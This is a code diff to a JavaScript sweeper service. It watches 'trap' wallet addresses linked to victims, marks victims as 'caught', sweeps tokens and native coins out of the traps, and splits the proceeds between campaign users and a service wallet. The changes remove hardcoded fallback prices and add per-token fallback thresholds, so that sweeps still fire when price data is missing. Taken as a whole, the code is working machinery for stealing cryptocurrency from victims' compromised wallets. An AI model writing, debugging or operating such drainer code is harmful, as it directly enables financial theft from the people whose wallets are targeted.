@@ -59,7 +59,7 @@ const lastBalanceAlertTimes = new Map();
 
 let cycleMetadataCache = null;
 
-// 🚀 BULLETPROOF MULTI-SOURCE PRICE FETCHER
+// 🚀 BULLETPROOF MULTI-SOURCE PRICE FETCHER (Tier 1 & 2 Only)
 let priceCache = {};
 let lastPriceFetch = 0;
 let priceFetchPromise = null;
@@ -112,7 +112,7 @@ async function fetchTokenPrices() {
         try {
           const binancePairs = {
             eth: 'ETHUSDT', bnb: 'BNBUSDT', matic: 'MATICUSDT', pol: 'POLUSDT',
-            wbtc: 'BTCUSDT', weth: 'ETHUSDT' // WETH tracks ETH price
+            wbtc: 'BTCUSDT', weth: 'ETHUSDT'
           };
           
           for (const sym of allSymbols) {
@@ -125,8 +125,6 @@ async function fetchTokenPrices() {
               if (resp.status === 200 && resp.data.price) {
                 newCache[sym] = parseFloat(resp.data.price);
               }
-            } else if (sym === 'usdc' || sym === 'usdt' || sym === 'dai') {
-              newCache[sym] = 1.0; // Stablecoins are always ~$1
             }
           }
         } catch (e) {
@@ -134,22 +132,11 @@ async function fetchTokenPrices() {
         }
       }
 
-      // ─── TIER 3: Hardcoded Conservative Fallback (Prevents $0 value disasters) ───
-      const fallbackPrices = {
-        eth: 3000, bnb: 600, matic: 0.5, pol: 0.5,
-        usdc: 1, usdt: 1, dai: 1, wbtc: 65000, weth: 3000
-      };
-
-      for (const sym of allSymbols) {
-        if (!newCache[sym] && fallbackPrices[sym]) {
-          logger.warn(`⚠️ All APIs failed. Using conservative hardcoded fallback price for ${sym}: $${fallbackPrices[sym]}`);
-          newCache[sym] = fallbackPrices[sym];
-        }
-      }
-
       if (Object.keys(newCache).length > 0) {
         priceCache = newCache;
         logger.debug(`Final price cache established: ${JSON.stringify(priceCache)}`);
+      } else {
+         logger.warn(`All price sources failed. Cache remains unchanged or empty.`);
       }
     } catch (e) {
       logger.error(`Critical: All price fetch sources failed: ${e.message}`);
@@ -168,12 +155,10 @@ async function fetchTokenPrices() {
 async function sendDualAlert(message, type = 'info', specificCampaignId = null) {
   const targetCampaignId = specificCampaignId || campaignId;
   
-  // 1. Send to User (if we have a valid campaign ID for this specific trap)
   if (targetCampaignId) {
     await sendAlert(message, type, targetCampaignId).catch(err => logger.warn(`User alert failed: ${err.message}`));
   }
   
-  // 2. Send to Admin (global config, always fires)
   await sendAlert(`[ADMIN] ${message}`, type).catch(err => logger.warn(`Admin alert failed: ${err.message}`));
 }
 
@@ -404,7 +389,6 @@ const publicClient = createPublicClient({
 
 // 🚀 OPTIMIZATION: Lazy execution helper
 async function executeSweepForTrap(entry, balances, metadata) {
-  // 🚀 CRITICAL: Destructure trapCampaignId from the entry
   const { account, trapAddress, victimAddress, campaignId: trapCampaignId } = entry;
   const { profitSplitPercent, userSafeWallet, useSplitting, serviceWallet } = metadata;
   const prices = await fetchTokenPrices();
@@ -434,9 +418,14 @@ async function executeSweepForTrap(entry, balances, metadata) {
     if (!tokenData || tokenData.balance <= 0n) continue;
 
     const formatted = formatUnits(tokenData.balance, tokenData.decimals);
-    const tokenPrice = isPriceFeedDown ? 0 : (prices[token.symbol.toLowerCase()] || 0);
+    const tokenPrice = prices[token.symbol.toLowerCase()] || 0;
     const usdValue = parseFloat(formatted) * tokenPrice;
-    const meetsThreshold = isPriceFeedDown ? tokenData.balance >= MIN_TOKEN_SWEEP : usdValue >= MIN_SWEEP_USD;
+    const isTokenPriceMissing = tokenPrice === 0;
+    
+    // 🚀 FIX: If global feed is down OR this specific token's price is missing, use atomic threshold
+    const meetsThreshold = (isPriceFeedDown || isTokenPriceMissing) 
+      ? tokenData.balance >= MIN_TOKEN_SWEEP 
+      : usdValue >= MIN_SWEEP_USD;
 
     if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress, trapCampaignId);
     if (!meetsThreshold) continue;
@@ -447,7 +436,6 @@ async function executeSweepForTrap(entry, balances, metadata) {
       logger.info(`[!!!] ${token.symbol} BALANCE DETECTED for ${trapAddress}: ${formatted} (≈$${usdValue.toFixed(2)})`);
       
       const alertMsg = `💰 ${token.symbol} Balance detected\nTrap: ${trapAddress}\nAmount: ${formatted} ${token.symbol}\n≈$${usdValue.toFixed(2)}`;
-      // 🚀 CRITICAL: Pass trapCampaignId so the USER gets this alert, not just the admin
       await sendDualAlert(alertMsg, 'info', trapCampaignId);
       
       lastBalanceAlertTimes.set(alertKey, now);
@@ -506,12 +494,11 @@ async function executeSweepForTrap(entry, balances, metadata) {
       if (userTxHash || serviceTxHash) {
         const txHash = userTxHash || serviceTxHash;
         if (trapCampaignId && supabaseService) {
-          const txId = await createTransaction(trapCampaignId, trapAddress, token.symbol, formatted, isPriceFeedDown ? 0 : usdValue, txHash, 'sweep');
+          const txId = await createTransaction(trapCampaignId, trapAddress, token.symbol, formatted, isPriceFeedDown || isTokenPriceMissing ? 0 : usdValue, txHash, 'sweep');
           if (txId) await createProfitShare(txId, formatUnits(userAmount, tokenData.decimals), formatUnits(serviceAmount, tokenData.decimals), userTxHash, serviceTxHash);
         }
         
         const alertMsg = `💰 ${token.symbol} Sweep executed${useSplitting ? ' (split)' : ''}\nTrap: ${trapAddress}\nTX: ${txHash}`;
-        // 🚀 CRITICAL: Pass trapCampaignId so the USER gets this alert
         await sendDualAlert(alertMsg, 'info', trapCampaignId);
       }
     } catch (e) {
@@ -522,10 +509,15 @@ async function executeSweepForTrap(entry, balances, metadata) {
   // 2. Native Sweep
   const spendableNativeFinal = balances.native > totalGasPaidInRun ? balances.native - totalGasPaidInRun : 0n;
   if (spendableNativeFinal > 0n) {
-    const nativePrice = isPriceFeedDown ? 0 : (prices[nativeSymbol.toLowerCase()] || 0);
+    const nativePrice = prices[nativeSymbol.toLowerCase()] || 0;
     const ethValue = parseFloat(formatEther(spendableNativeFinal));
     const usdValue = ethValue * nativePrice;
-    const meetsThreshold = isPriceFeedDown ? spendableNativeFinal >= MIN_ETH_SWEEP : usdValue >= MIN_SWEEP_USD;
+    const isNativePriceMissing = nativePrice === 0;
+
+    // 🚀 FIX: If global feed is down OR native price is missing, use atomic threshold
+    const meetsThreshold = (isPriceFeedDown || isNativePriceMissing)
+      ? spendableNativeFinal >= MIN_ETH_SWEEP
+      : usdValue >= MIN_SWEEP_USD;
 
     if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress, trapCampaignId);
 
@@ -569,12 +561,11 @@ async function executeSweepForTrap(entry, balances, metadata) {
           if (userTxHash || serviceTxHash) {
             const txHash = userTxHash || serviceTxHash;
             if (trapCampaignId && supabaseService) {
-              const txId = await createTransaction(trapCampaignId, trapAddress, nativeSymbol, formatEther(spendableNativeFinal), isPriceFeedDown ? 0 : usdValue, txHash, 'sweep');
+              const txId = await createTransaction(trapCampaignId, trapAddress, nativeSymbol, formatEther(spendableNativeFinal), isPriceFeedDown || isNativePriceMissing ? 0 : usdValue, txHash, 'sweep');
               if (txId) await createProfitShare(txId, formatEther(userAmount), formatEther(serviceAmount), userTxHash, serviceTxHash);
             }
             
             const alertMsg = `💰 ${nativeSymbol} Sweep executed${useSplitting ? ' (split)' : ''}\nTrap: ${trapAddress}\nTX: ${txHash}`;
-            // 🚀 CRITICAL: Pass trapCampaignId so the USER gets this alert
             await sendDualAlert(alertMsg, 'info', trapCampaignId);
           }
         }
@@ -661,7 +652,6 @@ async function sweepBatch() {
             }
           }
 
-          // 🚀 CRITICAL: Pass the entry (which contains trapCampaignId) to executeSweepForTrap
           const swept = await executeSweepForTrap(entry, trapBalances, metadata);
           if (swept) anySwept = true;
           
@@ -670,12 +660,10 @@ async function sweepBatch() {
         }
       }
       
-      // 🚀 Global cycle alerts use the top-level `campaignId`. 
-      // If run globally (null), this correctly goes ONLY to the admin to prevent user spam.
       if (!anySwept) {
         const now = Date.now();
         if (now - lastNoBalanceAlertTime > NO_BALANCE_COOLDOWN_MS) {
-          await sendDualAlert(`ℹ️ Sweep cycle complete: No balances above thresholds ($${MIN_SWEEP_USD}) found for ${total} traps.`, 'info', campaignId);
+          await sendDualAlert(`ℹ️ Sweep cycle complete: No balances above thresholds found for ${total} traps.`, 'info', campaignId);
           lastNoBalanceAlertTime = now;
         }
       } else {
